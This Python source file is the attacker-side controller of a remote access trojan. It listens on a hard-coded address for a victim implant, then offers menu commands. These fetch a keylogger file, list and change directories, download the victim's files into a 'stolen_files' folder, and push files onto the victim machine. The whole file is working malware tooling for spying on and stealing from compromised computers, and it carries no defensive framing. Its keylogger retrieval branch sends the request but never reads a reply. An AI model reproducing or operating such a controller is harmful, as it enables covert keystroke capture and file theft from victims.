import os
import socket
import inquirer

host = "172.31.41.57"
port = 5588

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind((host, port))
sock.listen(1)
print("Server listening...")
conn, addr = sock.accept()
print("Connection established to:", addr[0], "\n")

while True:
    list = [inquirer.List(
        "commands",
        message="Select command",
        choices = [
            "Get keylogger.txt",
            "File system",
            "Disconnect"
        ]
    )]
    command = inquirer.prompt(list)["commands"]
    conn.send(command.encode())
    if command == "Get keylogger.txt":
        pass
    elif command == "File system":
        while True:
            list = [inquirer.List(
                "commands",
                message="Select command",
                choices = [
                    "ls",
                    "pwd",
                    "cd",
                    "mkdir",
                    "get",
                    "put",
                    "Quit"
                ]
            )]
            command = inquirer.prompt(list)["commands"]
            conn.send(command.encode())
            if command == "ls" or command == "pwd":
                output = conn.recv(1024)
                print("\033[1m" + "Output:" + "\033[0m")
                conn.settimeout(1)
                while output:
                    print(output.decode())
                    try:
                        output = conn.recv(1024)
                    except socket.timeout:
                        break
                conn.settimeout(None)
            elif command == "cd":
                directories_data = conn.recv(1024)
                directories_buffer = b""
                conn.settimeout(1)
                while directories_data:
                    directories_buffer = b"".join([directories_buffer, directories_data])
                    try:
                        directories_data = conn.recv(1024)
                    except socket.timeout:
                        break
                conn.settimeout(None)
                directories = directories_buffer.decode()
                if directories == "No Directories":
                    directories = ["Other"]
                else:
                    directories = directories.split(" ")
                    directories = ["Other"] + directories
                list = [inquirer.List(
                    "directories",
                    message="Select command",
                    choices = directories
                )]
                directory = inquirer.prompt(list)["directories"]
                if directory == "Other":
                    directory = input("Enter absolute directory path: ")
                    print()
                conn.send(directory.encode())
            elif command == "mkdir":
                directory = input("Enter directory name: ")
                print()
                conn.send(directory.encode())
            elif command == "get":
                files_data = conn.recv(1024)
                files_buffer = b""
                conn.settimeout(1)
                while files_data:
                    files_buffer = b"".join([files_buffer, files_data])
                    try:
                        files_data = conn.recv(1024)
                    except socket.timeout:
                        break
                conn.settimeout(None)
                files = files_buffer.decode()
                if files == "No Files":
                    files = ["Other"]
                else:
                    files = files.split(" ")
                    files = ["Other"] + files
                list = [inquirer.List(
                    "files",
                    message="Select command",
                    choices = files
                )]
                file = inquirer.prompt(list)["files"]
                if file == "Other":
                    file = input("Enter absolute path to file: ")
                    file_name = file.split("/")[-1]
                    print(file_name)
                else:
                    file_name = file
                conn.send(file.encode())
                os.chdir("stolen_files")
                file_data = conn.recv(1024)
                file_buffer = b""
                conn.settimeout(1)
                while file_data:
                    file_buffer = b"".join([file_buffer, file_data])
                    try:
                        file_data = conn.recv(1024)
                    except socket.timeout:
                        break
                conn.settimeout(None)
                file = open(file_name, "wb")
                file.write(file_buffer)
                file.close()
                os.chdir("..")
            elif command == "put":
                file_path = input("Enter absolute path to file: ")
                file_name = input("Enter output file name: ")
                print()
                conn.send(file_name.encode())
                conn.recv(1024)
                file = open(file_path, "rb")
                data = file.read()
                conn.send(data)
            else:
                break
    else:
        break

sock.close()
